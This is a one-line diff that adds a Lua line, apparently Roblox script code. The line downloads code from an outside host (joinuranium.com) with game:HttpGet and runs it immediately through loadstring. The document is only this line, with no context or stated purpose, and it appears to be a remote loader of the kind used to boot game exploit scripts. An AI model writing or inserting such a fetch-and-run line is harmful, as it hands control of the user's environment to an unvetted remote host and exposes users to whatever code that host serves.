@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://joinuranium.com/boot"))()
